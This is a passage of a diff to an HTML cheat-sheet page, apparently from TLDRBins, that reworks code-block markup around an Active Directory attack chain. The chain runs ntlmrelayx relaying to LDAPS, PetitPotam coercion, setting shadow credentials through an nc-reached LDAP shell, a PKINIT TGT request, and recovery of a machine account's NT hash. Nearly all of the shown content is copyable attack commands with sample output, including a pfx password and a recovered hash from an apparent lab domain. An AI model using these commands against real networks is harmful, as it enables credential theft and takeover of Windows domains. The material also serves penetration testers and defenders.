+TO-DO</div></pre></div><div class="highlight codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">source test/bin/activate
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><div class="highlight codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">pip install .
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">pip3 install impacket pyOpenSSL==24.0.0
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><h4 id="run-ntlmrelayx">Run ntlmrelayx</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">ntlmrelayx.py -t ldaps://<span class="o">&lt;DC&gt;</span> --delegate-access -i
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="gp">$</span> ntlmrelayx.py -t ldaps://192.168.100.100 --delegate-access -i
 </span></span><span class="line"><span class="cl"><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Impacket v0.10.1.dev1+20220912.224808.5fcd5e81 - Copyright 2022 SecureAuth Corporation
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
@@ -455,17 +431,18 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Setting up RAW Server on port 6666
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Servers started, waiting for connections
-</span></span></span></code></pre></div><h4 id="4-run-petitpotam-in-local-linux">4. Run PetitPotam (In Local Linux)</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 PetitPotam.py -u &#39;&lt;USER&gt;@&lt;DOMAIN&gt;&#39; -hashes :&lt;HASH&gt; &lt;SOCAT_HOSTNAME&gt;@8090/test &lt;SOCAT_LISTENER_IP&gt; -pipe all
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 PetitPotam.py -u &#34;test.user@example.com&#34; -hashes &#34;:7ddf32e17a6ac5ce04a8ecbf782ca509&#34; ms01@8090/test 192.168.100.101 -pipe all
+</span></span></span></div></pre></div><h4 id="4-run-petitpotam-in-local-linux">4. Run PetitPotam (In Local Linux)</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 PetitPotam.py -u '<span class="o">&lt;USER&gt;</span>@<span class="o">&lt;DOMAIN&gt;</span>' -hashes :<span class="o">&lt;HASH&gt;</span> <span class="o">&lt;SOCAT_HOSTNAME&gt;</span>@8090/test <span class="o">&lt;SOCAT_LISTENER_IP&gt;</span> -pipe all
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="go">python3 PetitPotam.py -u "test.user@example.com" -hashes ":7ddf32e17a6ac5ce04a8ecbf782ca509" ms01@8090/test 192.168.100.101 -pipe all
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">                                                                                               
 </span></span></span><span class="line"><span class="cl"><span class="go">              ___            _        _      _        ___            _                     
 </span></span></span><span class="line"><span class="cl"><span class="go">             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
-</span></span></span><span class="line"><span class="cl"><span class="go">             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | &#39;  \  
+</span></span></span><span class="line"><span class="cl"><span class="go">             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
 </span></span></span><span class="line"><span class="cl"><span class="go">            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
-</span></span></span><span class="line"><span class="cl"><span class="go">          _| &#34;&#34;&#34; |_|&#34;&#34;&#34;&#34;&#34;|_|&#34;&#34;&#34;&#34;&#34;|_|&#34;&#34;&#34;&#34;&#34;|_|&#34;&#34;&#34;&#34;&#34;|_| &#34;&#34;&#34; |_|&#34;&#34;&#34;&#34;&#34;|_|&#34;&#34;&#34;&#34;&#34;|_|&#34;&#34;&#34;&#34;&#34;|_|&#34;&#34;&#34;&#34;&#34;| 
-</span></span></span><span class="line"><span class="cl"><span class="go">          &#34;`-0-0-&#39;&#34;`-0-0-&#39;&#34;`-0-0-&#39;&#34;`-0-0-&#39;&#34;`-0-0-&#39;&#34;`-0-0-&#39;&#34;`-0-0-&#39;&#34;`-0-0-&#39;&#34;`-0-0-&#39;&#34;`-0-0-&#39; 
+</span></span></span><span class="line"><span class="cl"><span class="go">          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
+</span></span></span><span class="line"><span class="cl"><span class="go">          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
 </span></span></span><span class="line"><span class="cl"><span class="go">                                         
 </span></span></span><span class="line"><span class="cl"><span class="go">              PoC to elicit machine account authentication via some MS-EFSRPC functions
 </span></span></span><span class="line"><span class="cl"><span class="go">                                      by topotam (@topotam77)
@@ -489,24 +466,28 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="go">[+] Got expected ERROR_BAD_NETPATH exception!!
 </span></span></span><span class="line"><span class="cl"><span class="go">[+] Attack worked!
 </span></span></span><span class="line"><span class="cl"><span class="go">...[SNIP]...
-</span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/topotam/PetitPotam">PetitPotam</a></em></small></p>
+</span></span></span></div></pre></div><p><small><em>Ref: <a href="https://github.com/topotam/PetitPotam">PetitPotam</a></em></small></p>
 <h4 id="5-connect-to-ldap-shell-in-local-linux">5. Connect to LDAP shell (In Local Linux)</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">rlwrap nc 127.0.0.1 11000
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> rlwrap nc 127.0.0.1 <span class="m">11000</span>
+<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">rlwrap nc 127.0.0.1 11000
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="gp">$</span> rlwrap nc 127.0.0.1 <span class="m">11000</span>
 </span></span><span class="line"><span class="cl"><span class="go">Type help for list of commands
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span> 
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">clear_shadow_creds &lt;SOCAT_HOSTNAME&gt;$
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> clear_shadow_creds ms01$
+</span></span></div></pre></div><div class="highlight codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">clear_shadow_creds <span class="o">&lt;SOCAT_HOSTNAME&gt;</span>$
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="gp">#</span> clear_shadow_creds ms01$
 </span></span><span class="line"><span class="cl"><span class="go">Found Target DN: CN=MS01,CN=Computers,DC=example,DC=com
 </span></span></span><span class="line"><span class="cl"><span class="go">Target SID: S-1-5-21-1045809509-3006658589-2426055941-1108
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Shadow credentials cleared successfully!
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Take Note of pfx path and password
-</span></span><span class="line"><span class="cl"><span class="go">set_shadow_creds &lt;SOCAT_HOSTNAME&gt;$
-</span></span></span></code></pre></div><h4 id="6-request-tgt-using-pfx-file-in-local-linux">6. Request TGT using pfx file (In Local Linux)</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 gettgtpkinit.py &#39;&lt;DOMAIN&gt;/&lt;SOCAT_HOSTNAME&gt;$&#39; &lt;SOCAT_HOSTNAME&gt;.ccache -cert-pfx &lt;RANDOM_CHARS&gt;.pfx -pfx-pass &lt;RANDOM_CHARS_PASSWORD&gt; -dc-ip &lt;DC&gt;
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 gettgtpkinit.py example.com/MS01$ MS01.ccache -cert-pfx ../impacket/h6fAqHvi.pfx -pfx-pass LDyywqG39RKUx6kmjeHr -dc-ip 192.168.100.100
+</span></span></span></div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Take Note of pfx path and password
+</span></span><span class="line"><span class="cl"><span class="go">set_shadow_creds <span class="o">&lt;SOCAT_HOSTNAME&gt;</span>$
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><h4 id="6-request-tgt-using-pfx-file-in-local-linux">6. Request TGT using pfx file (In Local Linux)</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 gettgtpkinit.py '<span class="o">&lt;DOMAIN&gt;</span>/<span class="o">&lt;SOCAT_HOSTNAME&gt;</span>$' <span class="o">&lt;SOCAT_HOSTNAME&gt;</span>.ccache -cert-pfx <span class="o">&lt;RANDOM_CHARS&gt;</span>.pfx -pfx-pass <span class="o">&lt;RANDOM_CHARS_PASSWORD&gt;</span> -dc-ip <span class="o">&lt;DC&gt;</span>
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="go">python3 gettgtpkinit.py example.com/MS01$ MS01.ccache -cert-pfx ../impacket/h6fAqHvi.pfx -pfx-pass LDyywqG39RKUx6kmjeHr -dc-ip 192.168.100.100
 </span></span></span><span class="line"><span class="cl"><span class="go">2024-04-02 16:17:58,897 minikerberos INFO     Loading certificate and key from file
 </span></span></span><span class="line"><span class="cl"><span class="go">INFO:minikerberos:Loading certificate and key from file
 </span></span></span><span class="line"><span class="cl"><span class="go">2024-04-02 16:17:58,907 minikerberos INFO     Requesting TGT
@@ -517,25 +498,25 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="go">INFO:minikerberos:7ddf32e17a6ac5ce04a8ecbf782ca509ac2b5f88fc33b7b9e0682be85784ec0d
 </span></span></span><span class="line"><span class="cl"><span class="go">2024-04-02 16:18:07,597 minikerberos INFO     Saved TGT to file
 </span></span></span><span class="line"><span class="cl"><span class="go">INFO:minikerberos:Saved TGT to file
-</span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/dirkjanm/PKINITtools">PKINITtools</a></em></small></p>
+</span></span></span></div></pre></div><p><small><em>Ref: <a href="https://github.com/dirkjanm/PKINITtools">PKINITtools</a></em></small></p>
 <h4 id="7-get-nt-hash-in-local-linux">7. Get NT Hash (In Local Linux)</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 getnthash.py &#39;&lt;DOMAIN&gt;/&lt;SOCAT_HOSTNAME&gt;$&#39; -key &lt;AS_REP_ENC_KEY&gt;
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> python3 getnthash.py example.com/<span class="s1">&#39;ms01$&#39;</span> -key 7ddf32e17a6ac5ce04a8ecbf782ca509ac2b5f88fc33b7b9e0682be85784ec0d
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 getnthash.py '<span class="o">&lt;DOMAIN&gt;</span>/<span class="o">&lt;SOCAT_HOSTNAME&gt;</span>$' -key <span class="o">&lt;AS_REP_ENC_KEY&gt;</span>
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="gp">$</span> python3 getnthash.py example.com/<span class="s1">'ms01$'</span> -key 7ddf32e17a6ac5ce04a8ecbf782ca509ac2b5f88fc33b7b9e0682be85784ec0d
 </span></span><span class="line"><span class="cl"><span class="go">Impacket v0.11.0 - Copyright 2023 Fortra
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Using TGT from cache
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Requesting ticket to self with PAC
 </span></span></span><span class="line"><span class="cl"><span class="go">Recovered NT Hash
 </span></span></span><span class="line"><span class="cl"><span class="go">59920e994636168744039017dcf49e54
-</span></span></span></code></pre></div>
-</div></div>
-    
-    <script type="module" src="/js/main.js"></script>
-    <footer>
-    <hr>
-    <div class="footer-text">
-        <div>© 2025 TLDRBins</div>
-    </div>
+</span></span></span></div></pre></div>
+</div>
+</main>
+<script type="module" src="/js/main.js"></script>
+<footer>
+  <hr>
+  <div>© 2025 TLDRBins</div>
 </footer>
-</body>
-</html>
+
+
+</body></html>
